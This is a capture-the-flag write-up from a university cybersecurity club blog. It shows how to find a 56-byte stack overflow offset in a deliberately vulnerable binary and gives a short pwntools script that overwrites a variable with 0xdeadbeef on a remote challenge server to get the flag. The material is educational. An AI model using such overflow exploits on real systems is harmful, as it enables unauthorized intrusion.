<!doctype html><html lang=en><head><script>MathJax={tex:{inlineMath:[['$','$'],['\\(','\\)']],displayMath:[['$$','$$'],["\\[","\\]"]],processEscapes:true,processEnvironments:true}}</script><script async id=MathJax-script src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="text/html; charset=UTF-8" http-equiv=content-type><meta content="width=device-width,initial-scale=1,user-scalable=no" name=viewport><meta content="index, follow" name=robots><title>What the canary</title><meta content="What the canary" name=title><meta content=exploiitm name=author><meta content="Official blog of Cybersecurity Club, IIT Madras" name=description><meta content=website property=og:type><meta content=https://exploiitm.github.io/blog/writeups/Guild_Selection_CTF/whatTheCanary/ property=og:url><meta content="exploiitm blog" property=og:site_name><meta content="What the canary" property=og:title><meta content="Official blog of Cybersecurity Club, IIT Madras" property=og:description><meta content=https://exploiitm.github.io/blog/favicon.ico property=og:image><meta content=summary_large_image property=twitter:card><meta content=https://exploiitm.github.io/blog/writeups/Guild_Selection_CTF/whatTheCanary/ property=twitter:url><meta content="What the canary" property=twitter:title><meta content="Official blog of Cybersecurity Club, IIT Madras" property=twitter:description><meta content=https://exploiitm.github.io/blog/favicon.ico property=twitter:image><link href=https://exploiitm.github.io/blog/writeups/Guild_Selection_CTF/whatTheCanary/ rel=canonical><link rel="shortcut icon" href=https://exploiitm.github.io/blog/favicon.ico type=image/x-icon><link href=https://speyll.github.io/suCSS/reset-min.css rel=stylesheet><link href=https://speyll.github.io/suCSS/suCSS-min.css rel=stylesheet><link href=https://exploiitm.github.io/blog/css/style.css rel=stylesheet><script defer src=https://exploiitm.github.io/blog/js/script.js></script><body><header><nav id=nav-bar><a href=https://exploiitm.github.io/> home </a><a href=/blog> blog </a><a href=/blog/writeups> writeups </a><a href=/blog/about> about </a><a href=/blog/contacts> contact </a><div><input id=theme-toggle style=display:none type=checkbox><label for=theme-toggle id=theme-toggle-label><svg class=icons id=theme-icon><use href=https://exploiitm.github.io/blog/icons.svg#lightMode></use></svg></label><audio id=theme-sound><source src=https://exploiitm.github.io/blog/click.ogg type=audio/ogg></audio></div></nav></header><main><div><a href=..>..</a>/<span class=accent-data>whatTheCanary</span></div><time datetime=2024-09-05>Published on: <span class=accent-data>2024-09-05</span></time><address rel=author>By <span class=accent-data> Achintya J, and exploiitm </span></address><h1>What the canary</h1><p>This provides us with a binary and the source code for a vulnerable program (hence the name vuln, duh). Now we’ll open the file using <code>gdb</code>, note that I am using <code>gdb-peda</code>and you might be using something else, so adapt accordingly<pre style=background:#282828;color:#fdf4c1aa><code><span>	gdb -q ./vuln
</span><span>	checksec
</span></code></pre><p>running <code>checksec</code> we can see that even though the challenge talks about canaries, there aren’t any canaries! If we run the program (just type <code>r</code>) we can see that it expects us to enter something.<p>Entering a random string we get this sort of a message,<pre style=background:#282828;color:#fdf4c1aa><code><span>	code == 0x0
</span><span>	code != 0xdeadbeef :(
</span><span>	Well, that was unexpected...
</span></code></pre><p>Well that means, we want the code to be <code>0xdeadbeef</code>. The first thing we’ll need to do is find out what offset overwrites this value. So, head over to <a href=https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html rel=noopener target=_blank>this</a> link to generate a random string.<p>Entering the 100 byte string: “Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A”, we get this<pre style=background:#282828;color:#fdf4c1aa><code><span>	code == 0x4130634139624138
</span><span>	code != 0xdeadbeef :(
</span><span>	Well, that was unexpected...
</span></code></pre><p>So, we’ve written something… what is that? If we convert that from hex, we can see that its “A0cA9bA8”. This string is not present anywhere in our input! However, its reverse “8Ab9Ac0A” is at the <code>56th</code> offset.<p>What this means is, if we enter 56 bytes, then the next 8 bytes will overwrite this address. This simple script can therefore be used to achieve the flag.<pre style=background:#282828;color:#fdf4c1aa><code><span>	from pwn import *
</span><span>	context.binary = binary = ELF("./vuln")
</span><span>	context.log_level = "critical"
</span><span>	payload = flat([
</span><span>		b"A"*56,
</span><span>		p32(0xdeadbeef) # simply enter the exact address, it will handle the endianness in its default values
</span><span>		])
</span><span>	p = remote('10.21.232.38', 7001)
</span><span>	p.sendline(payload)
</span><span>	p.interactive()
</span></code></pre><p>flag: <code>iitmCTF{N0-C@n@r!35-r3Qu!r3|)}</code><p class=tags-data></main><footer><hr><div class=footContainer><div class=footLeft><p>Licensed under <a rel="noopener noreferrer" href=https://fr.wikipedia.org/wiki/Licence_MIT target=_blank>MIT</a><br></div><div class=footRight><img class="footGif noStyle" alt=footGif loading=lazy src=https://i.ibb.co/XYDpfcs/foot.gif><a rel="noopener noreferrer" title="Subscribe via RSS for updates." class=metaData href=https://exploiitm.github.io/blog/atom.xml target=_blank>RSS</a></div></div></footer>